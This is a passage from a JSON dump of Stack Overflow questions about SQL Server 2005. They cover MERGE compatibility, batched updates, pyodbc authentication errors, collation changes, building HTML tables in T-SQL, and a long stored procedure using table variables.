put them into a temporary table with the XML values or null (depending on the changed action on that particular table).</p>\n\n<p>Any help would be appreciated.</p>\n"},{"tags":["sql-server-2005","visual-web-developer-2010"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":12750842,"title":"VSWDExpress 2010 - How to attach SQL Server 2005 database located on a different server","body":"<p>I have VSWD Express installed on Windows Server 2008. I created a MVC3 project on a Windows 7 machine with a SQL Express database. I moved that project to the server, and I'm getting an error that it can't find my database.</p>\n\n<p>This makes sense, because I didn't install the SQL Server Express onto the server. However, instead of using the Express database, I want to use an existing SQL Server 2005 database. However, this is also not installed on this particular web server, it's on another server.</p>\n\n<p>How can I use the SQL Server 2005 database without installing SQL Server 2005 onto the web server?</p>\n\n<p>TIA :)</p>\n"},{"tags":["sql-server-2008","sql-server-2005","merge"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12353514,"title":"SQL 2008 Merge Statement - 2008 Source - 2005 Target","body":"<p>Is it safe to say that if I'm trying to create a MERGE statment and run from SQL 2008, both the source and target database must be SQL 2008 or later?</p>\n\n<p>I'm trying to run a MERGE statement on SQL 2008 where the source is a SQL 2008 database and the target is 2005...but I get red squiggles under all 2005 table references.</p>\n"},{"tags":["c#","sql-server-2008","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":12749360,"title":"Restrict access to SQL SERVER 2005 or 2008 Express database to my c# app","body":"<p>I've always found answers here without having to open a thread, but this time I really need advice from specialists.</p>\n\n<p>My Windows Software creates a SQL Server Express Database as it installs, using scripts, and a IIS Server providing data to users through an extranet web-application.</p>\n\n<p>Database engine can be SQL Server 2005 Express or 2008 Express.</p>\n\n<p>My problematic is the following : I want to restrict access to the database to my IIS server, but I can't use a specific Windows account authentication. I actually use the default windows profile but it's of course not a good solution.</p>\n\n<p>I can't use TDE because of eventuality of 2005 database. I don't want to use CDE because of Indexing loose and performance issues.</p>\n\n<p>I of course can't specify database parameters manually.</p>\n\n<p>Is there a way to create schema or SQL Server user from my c# app, and makes my code the only accessor (except local administrators of the computer of course) to my database ?</p>\n\n<p>What my possibilities are? Which one do would you suggest me?</p>\n"},{"tags":["python","sql-server-2005","iis7","pyodbc"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":62,"score":1,"question_id":12736248,"title":"pyodbc connection to MSSQL 2005 server via IIS7","body":"<p>I have IIS7 installed and configured on my laptop and with a python cgi interface.   I can run the python script from within Eclipse and get the results I am looking for from the database.  But when I run the script from the webpage I get an authentication error.  It seems that the connection string is not passing the credentials to the SQL server.  Any thoughts?</p>\n\n<pre><code>import pyodbc\nimport cgi\nimport cgitb; cgitb.enable()\n\ncnxn = pyodbc.connect(driver='{SQL Server}', \n                  server='SERVER\\INSTANCE', \n                  Trusted_Connection='yes', \n                  database='Test_Chad', \n                  uid='SERVER\\username', \n                  pwd='password')\n\ndef getRow():\n    cursor = cnxn.cursor()\n    cursor.execute(\"select user_id, user_name from users\")\n    row = cursor.fetchone()\n    print 'name:', row.user_id     \n    print 'name:', row.user_name\n\ngetRow()\n</code></pre>\n\n<p>Exception:</p>\n\n<pre><code>&lt;class 'pyodbc.Error'&gt;: ('28000', \"[28000] [Microsoft][ODBC SQL Server Driver][SQL Server]Login failed for user 'NT AUTHORITY\\\\ANONYMOUS LOGON'.\n(18456) (SQLDriverConnect); [28000] [Microsoft][ODBC SQL Server Driver][SQL Server]Login failed for user 'NT AUTHORITY\\\\ANONYMOUS LOGON'. (18456)\") \nargs = ('28000', r\"[28000] [Microsoft][ODBC SQL Server Driver][SQL ... for user 'NT AUTHORITY\\ANONYMOUS LOGON'. (18456)\") \nmessage = ''\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","merge"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":12746457,"title":"Adaptation of the merge clauses in SQL Server 2005","body":"<p>I have a code which is up and running but the problem that I have is that it includes a lot of MERGE clauses as it was intended to be run from SQL Server 2008 and forward. But the problem is that a new customer is running SQL Server 2005 and as you know the Merge clause is not available till SQL Server 2008, so my question is if there is not a way to parse the this clauses automatically or if there is another solution (apart from rewriting all the clauses in clasical clauses ) as the customer is not willing to upgrade the DB.</p>\n\n<p>Thanks a lot in advance. </p>\n"},{"tags":["sql","sql-server-2005","reporting-services","subscription","data-driven"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12746748,"title":"Datadriven subscription error - SQL Server 2005","body":"<p>I am using SQL Server 2005.</p>\n\n<p>Connecting to: Reporting Services...</p>\n\n<p>Home folder -> I have my report: \"Report1\"</p>\n\n<p>For \"Report1\" I can add Subscriptions -> Data Driven Subscription...</p>\n\n<p>I go through the whole process and set a schedule to run at 12:00, 1st every month. And everything goes fine.</p>\n\n<p>But then when I look at the schedule again for the Data Driven Subscription, because the report is sent at 00:00 instead of 12:00.</p>\n\n<p>I go to the subscription notice the time has changed to 00:00 on 1.1.0001 (pic1)and get the following error when I want to set the schedule again(pic2):</p>\n\n<p><img src=\"http://i.stack.imgur.com/aTnc3.jpg\" alt=\"enter image description here\"></p>\n\n<p><img src=\"http://i.stack.imgur.com/rdYfP.jpg\" alt=\"enter image description here\"></p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":11,"favorite_count":3,"up_vote_count":12,"down_vote_count":0,"view_count":5887,"score":12,"question_id":3711217,"title":"Fastest way to update 120 Million records","body":"<p>I need to initialize a new field with the value -1 in a 120 Million record table.</p>\n\n<p>Update table\nset int_field = -1;</p>\n\n<p>I let it run for 5 hours before canceling it.</p>\n\n<p>I tried running it with transaction level set to read uncommitted with the same results.</p>\n\n<p>Recovery Model = Simple.</p>\n\n<p>MS SQL Server 2005</p>\n\n<p>Any advice on getting this done faster?</p>\n\n<p><strike>THANKS!\nDoing it in batches with top(N) seems to be working.  I used this code:</p>\n\n<pre><code>--for tracking batch perfomance\ncreate table ##counter (n int null,dt datetime default getdate() null)\n\ndeclare @rows int\nset @rows = 1\n\nwhile @rows &lt;&gt; 0\nbegin\n\n    begin transaction b\n\n    update top (1000000) dbo.TABLE\n       set int_field = -1\n     where int_field is null\n\n    set @rows = @@rowcount\n\n    insert into ##counter (n) values (@rows)\n\n    commit transaction b\n\nend\n</code></pre>\n\n<p>It's running at about a minute per batch so it should be done in 2 hours, not 5+.  I could probably tweak further.</strike></p>\n\n<p>Processing times began to tank (10 minutes per batch) after the first couple dozen.</p>\n\n<p>Good try though.</p>\n"},{"tags":["c#","asp.net","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":10,"view_count":54,"score":-10,"question_id":12746509,"title":"Gridview With Hyperlink in asp.net","body":"<p>I have one Table in my project which contains taskid, subject, message and date.\nand according to task_id, everyone can discuss on that task.\nso i have added new table in sql server.</p>\n\n<p>now i want to put list of all task in gridview.\ngridview contains hyperlink on each row.\nand on click on any row it will load new table of discussion on that particular task.</p>\n\n<p>how can i do this? </p>\n"},{"tags":["sql","sql-server-2005","tsql","constraints","foreign-key-relationship"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1439,"score":1,"question_id":5416926,"title":"Self referencing foreign-key constraints and delete","body":"<p>what is the recommended way to handle self-referencing foreignkey constraints in SQL-Server?</p>\n\n<p>Table-Model:</p>\n\n<p><img src=\"http://i.stack.imgur.com/MHdmX.jpg\" alt=\"enter image description here\"></p>\n\n<p><code>fiData</code> references a previous record in tabData. If i delete a record that is referenced by <code>fiData</code>, the database throws an exception: <code>\"The DELETE statement conflicted with the SAME TABLE REFERENCE constraint \"FK_tabDataPrev_tabDataNext\". The conflict occurred in database \"MyDataBase\", table \"dbo.tabData\", column 'fiData'\"</code> if <code>Enforce Foreignkey Constraint</code> is set to \"Yes\".</p>\n\n<p>I don't need to cascade delete records that are referenced but i would need to set <code>fiData=NULL</code> where it's referenced. My idea is to set <code>Enforce Foreignkey Constraint</code> to \"No\" and create a delete-trigger. Is this recommendable or are there better ways?</p>\n\n<p>Thank you.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":89,"score":6,"question_id":12744444,"title":"Select second highest value per distinct foreign key","body":"<p>So, I have two tables, account and invoice, they are linked by the primary key from the account table ie. account.key and invoice.key. </p>\n\n<p>I want to select account.accountnumber, invoice.invoicedate, invoice.invoiceamount for the second latest invoicedate from each account.</p>\n\n<p>Any ideas?</p>\n\n<p>So to select all invoices and their corresponding account numbers:</p>\n\n<pre><code>select a.accountnumber, i.invoicedate, i.invoiceamount\nfrom account a\njoin invoice i on (a.key = i.key)\n</code></pre>\n\n<p>And to select the second latest invoice from the entire invoice table:</p>\n\n<pre><code>select MAX(invoicedate) from INVOICE i where invoicedate NOT IN (SELECT MAX(invoicedate) from i\n</code></pre>\n\n<p>But how do I get the second latest invoice, per account from the invoice table, along with the account number from the account table?</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["sql-server","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12743023,"title":"SQL Server 2005 : change collation for the existing database and LINQ2SQL","body":"<p>I have a SQL Server 2005 database. It was created with default collation which is not case-sensitive (my fault!). That's different from all other databases which I work with, where collations are by default case sensitive. I mostly consider comparing strings than sorting. I use Linq-to-SQL where there is no way to specify collation for <code>WHERE</code> clause.</p>\n\n<p>It seems that changing collation of existing database / server (and all tables' fields!) is error-prone and there is no tools for this.</p>\n\n<p>Maybe I'm missing something and there is a clean way?</p>\n"},{"tags":["sql","sql-server-2005","text","occurences"],"answer_count":4,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":815,"score":1,"question_id":3778137,"title":"How to count the occurrences of a string inside TEXT datatype in sql server 2005","body":"<p>There is a column of datatype TEXT in my table. Now, I need to find the number of occurrences of a string in that TEXT field.\nI have already created a Full-text index on that table. But I don't know how to proceed further. \nI already found ways to count string occurrences for VARCHAR. But they cannot be applied AS IS to TEXT field. Any suggestions?</p>\n"},{"tags":["sql-server","sql-server-2008","tsql","sql-server-2005","stored-procedures"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":12727942,"title":"Can I Group By an Unknown Number of Columns?","body":"<p>I am currently trying to re-write a stored procedure to take into account the normalisation of one of our tables. In the original procedure we have two tables:    </p>\n\n<pre><code>CREATE TABLE #t_batch\n(batch_id   integer, \nthread_group NVARCHAR(60),\ndye_code_1  NVARCHAR(10),\ndye_conc_1  NUMERIC(19, 7),\ndye_code_2  NVARCHAR(10),\ndye_conc_2  NUMERIC(19, 7),\ndye_code_3  NVARCHAR(10),\ndye_conc_3  NUMERIC(19, 7),\ndye_code_4  NVARCHAR(10),\ndye_conc_4  NUMERIC(19, 7),\ndye_code_5  NVARCHAR(10),\ndye_conc_5  NUMERIC(19, 7),\ndye_code_6  NVARCHAR(10),\ndye_conc_6  NUMERIC(19, 7))\n\nCREATE TABLE #t_group\n(group_id   INTEGER IDENTITY(1, 1),\ndye_code_1  NVARCHAR(10),\ndye_conc_1  NUMERIC(19, 7),\ndye_code_2  NVARCHAR(10),\ndye_conc_2  NUMERIC(19, 7),\ndye_code_3  NVARCHAR(10),\ndye_conc_3  NUMERIC(19, 7),\ndye_code_4  NVARCHAR(10),\ndye_conc_4  NUMERIC(19, 7),\ndye_code_5  NVARCHAR(10),\ndye_conc_5  NUMERIC(19, 7),\ndye_code_6  NVARCHAR(10),\ndye_conc_6  NUMERIC(19, 7),\nthread_group NVARCHAR(60), \nnum_batches INTEGER)\n</code></pre>\n\n<p>After a number of actions #t_batch was populated with a number of records. We then inserted data into #t_group in the following way:</p>\n\n<pre><code>INSERT INTO #t_group\n(dye_code_1, dye_conc_1, dye_code_2, dye_conc_2, dye_code_3, dye_conc_3,\ndye_code_4, dye_conc_4, dye_code_5, dye_conc_5, dye_code_6, dye_conc_6, \nthread_group, num_batches)\nSELECT dye_code_1, dye_conc_1, dye_code_2, dye_conc_2, dye_code_3, dye_conc_3, \ndye_code_4, dye_conc_4, dye_code_5, dye_conc_5, dye_code_6, dye_conc_6, \nthread_group, COUNT(batch_id_fk)\nFROM #t_batch\nGROUP BY dye_code_1, dye_conc_1, dye_code_2, dye_conc_2, dye_code_3, dye_conc_3, \ndye_code_4, dye_conc_4, dye_code_5, dye_conc_5, dye_code_6, dye_conc_6, \nthread_group\nORDER BY dye_code_1, dye_conc_1, dye_code_2, dye_conc_2, dye_code_3, dye_conc_3, \ndye_code_4, dye_conc_4, dye_code_5, dye_conc_5, dye_code_6, dye_conc_6, \nthread_group\n</code></pre>\n\n<p>So, we had a series of records that are grouped by the dye columns and a unique group_id for each unique combination of dyes and their concentrations. Also, there is a count of the batch records for each group. </p>\n\n<p>However, since there is in reality no limit to the number of dyes for a batch the tables have been normalised:</p>\n\n<pre><code>CREATE TABLE #t_batch\n(batch_id   INTEGER, \nthread_group NVARCHAR(60))\n\nCREATE TABLE #t_batch_dye\n(batch_id_fk INTEGER, \nstage   INTEGER,\nsequence    INTEGER, \ndye_code    NVARCHAR(10),\ndye_conc    NUMERIC(19,7))\n\nCREATE TABLE #t_group\n(group_id   INTEGER IDENTITY(1, 1),\nthread_group NVARCHAR(60), \nnum_batches INTEGER)\n\nCREATE TABLE #t_group_dye\n(group_id   INTEGER, \nstage   INTEGER,\nsequence    INTEGER,\ndye_code    NVARCHAR(10),\ndye_conc    NUMERIC(19,7))\n</code></pre>\n\n<p>Now, my question is: assuming that we have #t_batch and #t_batch_dye populated and that there are a varying number of #t_batch_dye records for each record in #t_batch, how can I insert records into #t_group with a unique group_id for each unique combination of dyes and their concentrations as well as a count of the batches for each group?</p>\n\n<p>Is this something I could use the PIVOT keyword for? The examples I have found on the web all seem to assume that the number of pivoted fields is known in advance.</p>\n\n<p>Many thanks, </p>\n\n<p>David</p>\n\n<p>Glasgow, Scotland</p>\n\n<hr>\n\n<p>Update:</p>\n\n<p>What I have done is to use a function that returns a concatenated string of codes and concs and used that to group the data.</p>\n\n<pre><code>DECLARE @dyes NVARCHAR(2000)  \n\n SELECT @dyes = ISNULL(@dyes,'') + dye_code + ' ' + convert(nvarchar,      requested_dye_conc) + ' '\n FROM   #t_batch_dye\n WHERE  batch_id_fk = @batch_id\n ORDER BY dye_code ASC\n</code></pre>\n"},{"tags":["php","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":12740288,"title":"how to connect php 5.4.4 to MSSQL server 2005","body":"<p>Q : How to php 5.4.4 (xampp 1.8.0) to MSSQL Server 2005?</p>\n\n<p>Status : I download SQLSRV30.EXE from <a href=\"http://www.microsoft.com/en-us/download/details.aspx?id=20098\" rel=\"nofollow\">here</a>. And installed .dll files into my php/ext folder. And I setup extension at php.ini. But can't connect to MSSQL server 2005.</p>\n"},{"tags":["sql-server-2005","grouping","aggregate","with-statement"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":140,"score":0,"question_id":4668833,"title":"data cleansing using grouping based on time interval - sql2005","body":"<p>I have the following data in a table that I would like to report on without having to delete any rows.</p>\n\n<p>ActiveSearchID---SearchDate---------------------SearchPhrase<Br>\n1---------------------2010-12-15 12:01:11.587---argos<Br>\n2---------------------2010-12-15 12:03:40.193---muji<Br>\n3---------------------2010-12-15 12:03:42.370---muji<Br>\n4---------------------2010-12-15 12:04:29.167---Office supplies<Br>\n5---------------------2010-12-15 12:05:11.590---lava<Br>\n9---------------------2010-12-15 12:08:38.920---sony vaio<Br>\n10-------------------2010-12-15 12:08:41.170---sony vaio<Br>\n12-------------------2010-12-15 12:09:09.920---sony vaio battery<Br>\n13-------------------2010-12-15 12:09:17.487---sony vaio battery<Br>\n14-------------------2010-12-15 12:17:10.980---sony vaio battery<Br>\n15-------------------2010-12-15 12:17:12.170---argos<Br>\n<Br>\nThe report I am trying to get is to select the first instance of a searchphrase that has been searched on within a 5 minute interval.\nSo for example the query no the information above would result in the following:\n<br>\nSearchDate----------------SearchPhrase<br>\n2010-12-15 12:01:11.587---argos<br>\n2010-12-15 12:03:40.193---muji<br>\n2010-12-15 12:04:29.167---Office supplies<br>\n2010-12-15 12:05:11.590---lava<br>\n2010-12-15 12:08:38.920---sony vaio<br>\n2010-12-15 12:09:09.920---sony vaio battery<Br>\n2010-12-15 12:17:12.170---argos<Br></p>\n\n<p><br></p>\n\n<p>i've tried the following query but i am still getting duplicates:<Br></p>\n\n<p>select t1.searchdate, t1.searchphrase\nfrom activesearches t1\ninner join activesearches t2 on t1.searchphrase = t2.searchphrase \n    and t1.searchdate &lt; t2.searchdate\nwhere datediff(s, t1.searchdate, t2.searchdate) &lt;= 300 \norder by searchdate</p>\n\n<p><br></p>\n\n<p>I would like to use the \"WITH SearchPhrases AS ()\" type of query but I just can't get my head around it.</p>\n\n<p>Thanks</p>\n"},{"tags":["html","string","sql-server-2005","string-concatenation","html-table"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":12729929,"title":"How to build an HTML table with subtotals using a recursive string concatenation?","body":"<p>I have the next two tables:</p>\n\n<pre><code>CREATE TABLE #SalesByStore (\n    Brand VARCHAR(10),\n    StoreName VARCHAR(50),\n    Sales DECIMAL(10,2)\n)\n\nCREATE TABLE #SalesByBrand (\n    Brand VARCHAR(10),\n    TotalSales DECIMAL(10,2)\n)\n</code></pre>\n\n<p>I am trying to build an HTML table body using recursive string concatenation, and I need to show the sales by store ordered by brand, and after each group of stores from a same brand show the sales subtotals for that brand, like this:</p>\n\n<p><img src=\"http://i.stack.imgur.com/1jDZP.gif\" alt=\"enter image description here\"></p>\n\n<p>I am doing it the following way:</p>\n\n<pre><code>DECLARE @tableBody NVARCHAR(MAX), @lastBrand VARCHAR(10);\nSELECT @tableBody='';\n\nSELECT\n  @tableBody\n    = @tableBody\n      + CASE\n          WHEN @lastBrand IS NOT NULL AND @lastBrand&lt;&gt;SS.Brand\n            THEN '&lt;tr&gt;&lt;td colspan=\"2\"&gt;Subtotal&lt;/td&gt;&lt;td&gt;'\n                 + (SELECT TOP 1 CAST(SB.TotalSales AS VARCHAR(15)) FROM #SalesByBrand SB WHERE SB.Brand=@lastBrand)\n                 + '&lt;/td&gt;&lt;/tr&gt;'\n            ELSE '' END\n      + '&lt;tr&gt;&lt;td&gt;' + SS.Brand + '&lt;/td&gt;&lt;td&gt;'\n      + SS.StoreName + '&lt;/td&gt;&lt;td&gt;' + CAST(SS.Sales AS VARCHAR(15)) + '&lt;/td&gt;&lt;/tr&gt;',\n  @lastBrand = SS.Brand\nFROM #SalesByStore SS\nORDER BY SS.Brand\n</code></pre>\n\n<p>The problem is that the sub-query that gets me the sub-total amount by brand always returns NULL because @lastBrand remains null for the sub-query (see this stack overflow question for an explain about why this happens: <a href=\"http://stackoverflow.com/questions/12647808/why-subquery-inside-recursive-string-concatenation-always-returns-null\">Why subquery inside recursive string concatenation always returns NULL?</a>).</p>\n\n<p>Can you suggest me another way to create the HTML table with subtotals in SQL Server 2005?</p>\n\n<p>By the way, I need to build the HTML table in SQL Server in order to send it inside a db mail.</p>\n\n<p><strong>EDIT:</strong> I have moved the case from the ending to the beggining of the concatenation, because the subtotal row must be draw before the new brand group begins. Sorry for the mistake.</p>\n"},{"tags":["asp.net","sql-server-2005","visual-studio-2008","gridview"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":169,"score":0,"question_id":11855637,"title":"Fixed Header with autogenerate columns","body":"<p>Is there a way to have fixed Headers with autogenerate columns?  I am against creating the headers manually since we will be using the same gridview for different information.  </p>\n\n<p>Also, is there a way to align a header/row differently from the rest?  Lets say I always want all the rows and header to align center except for the row \"name\".  Is it possible to do an if statement for that?  Or maybe there is an easier way?</p>\n\n<p>I am always open to any ideas of using a different graph also.  So if anyone has any, that would be great suggestions.</p>\n\n<p>Thanks!</p>\n"},{"tags":["sql-server-2005","ssis"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":12731380,"title":"Programmatically edit SQL in Data Flow task (SSIS 2005)","body":"<p>I need to execute a SELECT query with one variable (in the WHERE clause) from an AS/400 source. I have an OLE DB driver, but it does not seem to support using a ? [error is Exception from HRESULT: 0x80040E10 (Microsoft.SqlServer.SQLTaskConnectionsWrap)]</p>\n\n<p>Obviously, this should be do-able by programmatically editing my SQL (I'm guessing from the Script task), but I'm not sure where in the object model I can find the SQL related to my Data Flow task.</p>\n\n<p>If people have other suggestions entirely, I'm open to that as well, I just need to execute a parameterized query where the value replaces the parameter on the client-side before sending the query over. Thanks!</p>\n"},{"tags":["sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1639,"score":0,"question_id":4645210,"title":"SQL SERVER NON-Clustered Index on table variable?","body":"<p>How can we create non-clustered index on table variable?</p>\n\n<p><strong>Create Table @risk \n(rskid int)</strong></p>\n\n<p><strong>Create nonclustered index r_rskid_nc on @risk(rskid)</strong></p>\n\n<p>It does not work??</p>\n\n<hr>\n\n<h2><strong>My proc</strong></h2>\n\n<p><em><strong>How can i optimize it ??</em></strong></p>\n\n<p>ALTER PROCEDURE [dbo].[SPR_LV004]\n   (\n    @TopN INT\n   ,@LoggedUserId INT\n   ,@Entity VARCHAR(255)\n   ,@OpModel VARCHAR(255)\n   ,@RiskCat VARCHAR(255)\n   ,@RsdlInh VARCHAR(1)\n   ,@DisplayAction VARCHAR(1)\n   ,@LastAssDate DATETIME\n   )\nAS </p>\n\n<pre><code>  SET NOCOUNT ON\n\nDECLARE @Thisdate DATETIME\n\nSET @ThisDate = GETDATE()\n\nDECLARE @MainFilter  TABLE(\n            fcaName VARCHAR(100)\n           ,fctName VARCHAR(100)\n           ,rskId INT PRIMARY KEY CLUSTERED )\n\nDECLARE @Tgt  TABLE(rasRiskId INT\n           ,rasId INT\n           ,RAMName VARCHAR(100)\n           ,RAMColour INT\n           ,RAMImpDesc VARCHAR(100)\n           ,RAMLikDesc VARCHAR(100)\n           ,RAMImpScore INT\n           ,RAMLikScore INT\n            ,LastScore INT\n            ,AnnualExposure NUMERIC(15, 0)\n            ,Currency VARCHAR(9)\n            ,OverallExp NUMERIC(15,0)\n            ,Frequency INT\n            ,LastAssessmentDate DATETIME)\n\nDECLARE @Inh  TABLE(rasRiskId INT\n           ,rasId INT\n           ,RAMName VARCHAR(100)\n           ,RAMColour INT\n           ,RAMImpDesc VARCHAR(100)\n           ,RAMLikDesc VARCHAR(100)\n           ,RAMImpScore INT\n           ,RAMLikScore INT\n            ,LastScore INT\n            ,AnnualExposure NUMERIC(15, 0)\n            ,Currency VARCHAR(9)\n            ,OverallExp NUMERIC(15,0)\n            ,Frequency INT\n            ,LastAssessmentDate DATETIME)\n\nDECLARE @Res  TABLE(rasRiskId INT\n            ,rasId INT\n            ,RAMName VARCHAR(100)\n            ,RAMColour INT\n            ,RAMimpDesc VARCHAR(100)\n            ,RAMlikDesc VARCHAR(100)\n            ,RAMImpScore INT\n            ,RAMLikScore INT\n            ,LastScore INT\n            ,AnnualExposure NUMERIC(15, 0)\n            ,Currency VARCHAR(9)\n            ,OverallExp NUMERIC(15,0)\n            ,Frequency INT\n            ,LastAssessmentDate DATETIME)\n\nDECLARE @RiskData  TABLE(RAMScore INT\n           ,AnnExp NUMERIC(15, 0)\n           ,rskId INT\n           ,RiskID VARCHAR(20)\n           ,rskDescription VARCHAR(150)\n           ,LongDesc VARCHAR(4000)\n           ,RiskAssessmentDate VARCHAR(100)\n           ,RAMName VARCHAR(100)\n           ,rskRAMId INT\n           ,rskRiskProfile INT\n           ,EntityInfo VARCHAR(100)\n           ,OwnerName VARCHAR(100)\n           ,NomineeName VARCHAR(100)\n           ,ReviewerName VARCHAR(100)\n            ,TgtRasId INT\n           ,TgtRamName VARCHAR(100)\n           ,TgtRamColour INT\n           ,TgtRamImpDesc VARCHAR(100)\n           ,TgtRamLikDesc VARCHAR(100)\n           ,TgtRamImpScore INT\n           ,TgtRamLikScore INT\n           ,TgtLastScore INT\n           ,TgtAnnualExp Numeric(15,0)\n           ,TgtCurrency VARCHAR(9)\n           ,InhRasId INT\n           ,InhRamName VARCHAR(100)\n           ,InhRamColour INT\n           ,InhRamImpDesc VARCHAR(100)\n           ,InhRamLikDesc VARCHAR(100)\n           ,InhRamImpScore INT\n           ,InhRamLikScore INT\n           ,InhLastScore INT\n           ,InhAnnualExp Numeric(15,0)\n           ,InhCurrency VARCHAR(9)\n           ,RsdRasId INT\n           ,RsdRamName VARCHAR(100)\n           ,RsdRamColour INT\n           ,RsdRamImpDesc VARCHAR(100)\n           ,RsdRamLikDesc VARCHAR(100)\n           ,RsdRamImpScore INT\n           ,RsdRamLikScore INT\n           ,RsdLastScore INT\n           ,rsdAnnualExp Numeric(15,0)\n           ,RsdCurrency VARCHAR(9)\n           ,fcaName VARCHAR(100)\n           ,fctName VARCHAR(100)\n           ,CCRId VARCHAR(15)\n           ,crrDescription VARCHAR(150)\n           ,Assessed char(1)\n           ,Attested Char(1)\n           ,DisplayAction VARCHAR(1)               \n           ,opModelName VARCHAR(255)\n           ,severity NUMERIC(15,0)\n           ,topriskcat VARCHAR(100)\n           ,TgtOverallExp NUMERIC(15,0)\n           ,TgtFrequency INT\n           ,InhOverallExp NUMERIC(15,0)\n           ,InhFrequency INT\n           ,ResOverallExp NUMERIC(15,0)\n           ,ResFrequency INT)\n\n    DECLARE @RiskCtrl  TABLE(\n            rcnRiskId INT\n            ,rcnId INT\n            ,ControlInfo VARCHAR(1100) \n            ,Performance INT --VARCHAR(60)              ,Design INT --VARCHAR(60)\n            ,ControlOwner VARCHAR(100)\n            ,ControlNominee VARCHAR(100)\n            ,ControlReviewer VARCHAR(100))\n\n    DECLARE  @ACTIONS  TABLE(\n            ActionRiskId INT\n           ,ControlID INT\n           ,actTgtCompleteDate VARCHAR(9)\n           ,actTgtODueDate VARCHAR(9)\n           ,RATgtDate VARCHAR(9)\n           ,ActNominee VARCHAR(100)             \n           ,ActOwner VARCHAR(100)      \n           ,ActCompleteAmt INT              \n           ,ActionDetail VARCHAR(MAX)\n           ,AType INT\n           ,ActionState VARCHAR(90) )\n\n    DECLARE  @TopRiskSort  TABLE(\n            RdRecId INT IDENTITY(1,1) NOT NULL\n            ,AnnExp NUMERIC(15, 0)\n            ,rskId INT\n            ,severity NUMERIC(15,0)\n            )\n\n\n    DECLARE  @TopRisk  TABLE(\n            AnnExp NUMERIC(15, 0)\n            ,rskId INT\n            ,severity NUMERIC(15,0)\n            )\n\n   -- New tables for LV004 06-JAN-2010\n   -- gets the parent Operational Model -- by priyanka \n    DECLARE @OpModels TABLE(\n            OpModelName VARCHAR(255),\n            rskId INT)\n\n    DECLARE @TopRiskCat TABLE(\n        rskid INT PRIMARY KEY CLUSTERED,\n        topRiskCat VARCHAR(1000))\n\n    --LOCAL VARIABLES \n    DECLARE @Query VARCHAR(8000)\n\n    --Create filter data in a Table datatype\n    INSERT INTO @MainFilter\n    SELECT DISTINCT\n            NULL as fcaName\n           ,NULL as fctName\n           ,R.rskId               \n    FROM     RiskProfiles RP\n    INNER JOIN RiskProfileFactAnal RPF\n    ON       RP.rwkReference = RPF.wfaRiskProfile\n    INNER JOIN FactCatAnal FA\n    ON       RPF.wfaFactAnalId = FA.fcaId\n    INNER JOIN UserViewsEntity UE\n    ON       RPF.wfaRiskProfile = UE.uveEntId\n    INNER JOIN Risks R\n    ON       RP.rwkReference = R.rskRiskProfile\n    INNER JOIN RiskAnalysis RA\n    ON       R.rskId = RA.ranRiskId\n    INNER JOIN RiskCategory RC\n    ON       RA.ranRiskAnalId = RC.rctId\n    LEFT OUTER JOIN RiskAssessment RASS\n    ON       R.rskId = RASS.rasRiskId      \n            AND R.rskRelevant = 'Y'\n    WHERE    (UE.uveUserId = @LoggedUserId)                     \n            --AND FA.fcaId in (SELECT FinalID FROM @FinalTree)\n            AND FA.fcaId in (SELECT TreeTableID FROM [dbo].[OpModelListToTable](@OpModel))              AND RP.rwkReference in (SELECT TreeTableID FROM [dbo].[EntityListToTable](@Entity))\n            AND RC.rctid in (SELECT TreeTableID FROM [dbo].[RiskCategoryListToTable](@RiskCat))\n            AND R.rskOpendate &lt;= @LastAssDate\n  -- Insertion into new tables\n   INSERT INTO @OpModels \n     SELECT  FCA.fcaName AS TopLevelBusinessLine,\n                    Rsk.rskid\n     FROM @MainFilter MF \n             INNER JOIN Risks RSK \n                    ON  RSK.rskid= MF.rskId   \n             INNER JOIN  RiskProfileFactAnal RPF\n                    ON RPF.wfaRISkProfile = RSK.rskRiskProfile\n             INNER JOIN FactCatAnal FCA \n                    ON FCA.fcaId = RPF.wfaFactAnalId \n             INNER JOIN FactCategory  FC\n                    ON FC.fctid = FCA.fcaCategory and FC.fctName='Business Unit'                                \n\n  INSERT INTO @TopRiskCat\n        SELECT R.rskid\n              ,dbo.fn_GetTopParentRiskCategoryScalar(RC.rctId) as TopLevelRiskCat\n        FROM @MainFilter MF \n        INNER JOIN  RISKS R \n            ON  R.rskid= MF.rskId   \n        INNER JOIN RiskAnalysis RA\n            ON R.rskId = RA.ranRiskId\n        INNER JOIN RiskCategory as RC\n            ON RA.ranRiskAnalId = RC.rctId\n\n\n    -- Target Data\n    INSERT   INTO @Tgt\n    SELECT 